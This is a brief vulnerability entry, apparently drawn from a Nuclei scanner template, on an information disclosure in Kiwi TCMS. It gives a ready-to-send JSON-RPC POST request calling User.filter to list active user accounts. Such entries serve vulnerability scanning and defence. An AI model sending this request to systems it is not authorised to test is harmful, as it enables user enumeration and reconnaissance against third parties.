# Vulnerability: Kiwi TCMS Information Disclosure
**Classification:** KIWITCMS
**Source:** Nuclei Template (`kiwitcms-json-rpc.yaml`)

## Description
Internal info exposed in Kiwi TCMS.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /json-rpc/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept-Encoding: gzip, deflate

{"jsonrpc":"2.0","method":"User.filter","id": 1,"params":{"query":{"is_active":true}}}
```

